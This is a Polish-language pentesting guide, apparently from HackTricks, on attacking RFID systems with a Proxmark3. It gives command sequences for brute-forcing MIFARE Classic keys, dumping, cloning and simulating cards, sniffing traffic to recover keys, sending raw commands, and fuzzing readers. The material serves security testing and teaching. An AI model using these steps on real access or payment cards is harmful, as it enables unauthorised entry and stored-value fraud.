# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atakowanie systemów RFID za pomocą Proxmark3

Zainstaluj aktywnie utrzymywanego klienta RRG/Iceman Proxmark3 i odpowiadające mu firmware, a następnie sprawdź składnię poleceń dla tej wersji, ponieważ starsze polecenia pokazane poniżej mogły się zmienić.<sup>[[1]](#references)[[5]](#references)</sup>

### Atakowanie MIFARE Classic 1KB

MIFARE Classic 1K ma **16 sektorów**, z których każdy zawiera **4 bloki** po **16 bajtów**. Blok producenta 0 zawiera UID i dane producenta i jest tylko do odczytu na oryginalnych kartach NXP; specjalne karty-klony lub karty „magic” mogą pozwalać na jego ponowne zapisanie.<sup>[[1]](#references)[[2]](#references)</sup>\
Aby uzyskać dostęp do każdego sektora, potrzebujesz **2 kluczy** (**A** i **B**), które są przechowywane w **bloku 3 każdego sektora** (trailerze sektora). Trailer sektora przechowuje również **bity dostępu**, które określają uprawnienia **odczytu i zapisu** dla **każdego bloku** przy użyciu tych 2 kluczy.\
2 klucze są przydatne, aby na przykład nadać uprawnienia do odczytu, jeśli znasz pierwszy klucz, i do zapisu, jeśli znasz drugi.

Można przeprowadzić kilka ataków

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 pozwala wykonywać inne działania, takie jak **podsłuchiwanie** komunikacji **Tag to Reader**, aby spróbować znaleźć wrażliwe dane. W przypadku tej karty wystarczy sniffować komunikację i obliczyć użyty klucz, ponieważ **zastosowane operacje kryptograficzne są słabe**, a znając tekst jawny i szyfrogram, można go obliczyć (narzędzie `mfkey64`).<sup>[[3]](#references)</sup>

#### Szybki workflow MiFare Classic do nadużywania zapisanej wartości

Informacje o sekwencji odzyskiwania klucza, porównywania salda, polu integralności i klonowania UID — w tym transkrypcję klienta Proxmark3 i ograniczenia kart magicznych — znajdziesz w artykule [Offline'owe manipulowanie zapisaną wartością MiFare Classic](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).

### Surowe polecenia

Systemy IoT czasami używają **niebrandowanych lub niekomercyjnych tagów**. W takim przypadku możesz użyć Proxmark3, aby wysyłać **surowe polecenia do tagów**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Na podstawie tych informacji możesz spróbować znaleźć informacje o karcie i sposobie komunikacji z nią. Proxmark3 umożliwia wysyłanie surowych poleceń, takich jak: `hf 14a raw -p -b 7 26`

### Skrypty

Oprogramowanie Proxmark3 zawiera wstępnie załadowaną listę **skryptów automatyzujących**, których możesz używać do wykonywania prostych zadań. Aby pobrać pełną listę, użyj polecenia `script list`. Następnie użyj polecenia `script run`, po którym podaj nazwę skryptu:

```
proxmark3> script run mfkeys
```

Możesz napisać skrypt do **fuzzowania czytników tagów**: skopiuj dane z **prawidłowej karty**, napisz **skrypt Lua**, który **losowo modyfikuje** jeden lub więcej losowych **bajtów**, i sprawdzaj, czy przy którejś iteracji **czytnik ulega awarii**.

## References

- [1] [Wiki Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki Proxmark3: karty HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Stanowisko NXP w sprawie MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Wykorzystanie podatności kart NFC w systemie KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — instalacja w systemie Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
